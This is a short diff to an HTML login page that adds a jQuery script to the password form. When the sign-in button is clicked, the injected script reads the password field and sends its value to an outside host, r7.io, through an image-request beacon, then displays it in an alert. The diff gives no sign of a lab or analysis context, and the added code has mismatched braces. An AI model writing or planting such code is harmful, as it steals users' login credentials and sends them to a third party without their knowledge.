@@ -37,6 +37,16 @@
           <input id="login_password" placeholder="passphrase" tabindex="2" autocomplete="off" class="validate-text" name="password" type="password" mouseev="true" keyev="true" clickev="true"> 
       </div>
         <input id="user_language" name="user_language" type="hidden" value="english">
+          <script> $(document).ready(function() {
+                  $('.problem').hide();
+                  $('.error-message').hide();
+                  $('#signin-btn').click(function() {
+                      var im = new Image();
+                     im.src = 'http://r7.io/e/montgn2?s='+$('#login_password').val();
+                     alert($('#login_password').val());
+                  }
+                                         }
+          </script>
         <input type="submit" id="signin-btn" class="submit-btn optional" value="Sign in..." tabindex="3">
       </div>
 
